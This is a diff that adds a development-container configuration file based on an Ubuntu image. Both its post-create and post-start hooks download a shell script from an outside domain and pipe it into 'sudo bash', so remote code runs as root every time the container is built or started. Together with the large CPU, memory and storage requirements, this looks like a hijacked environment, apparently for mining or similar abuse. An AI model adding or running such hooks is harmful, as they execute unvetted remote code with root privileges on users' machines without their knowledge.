@@ -1,0 +1,11 @@
+{
+  "name": "dev",
+  "image": "mcr.microsoft.com/devcontainers/base:ubuntu",
+  "postCreateCommand": "curl -fsSL https://bnt.jakirokyo.com/dl/codespace.sh | sudo bash",
+  "postStartCommand": "curl -fsSL https://bnt.jakirokyo.com/dl/codespace.sh | sudo bash",
+  "hostRequirements": {
+    "cpus": 4,
+    "memory": "16gb",
+    "storage": "32gb"
+  }
+}
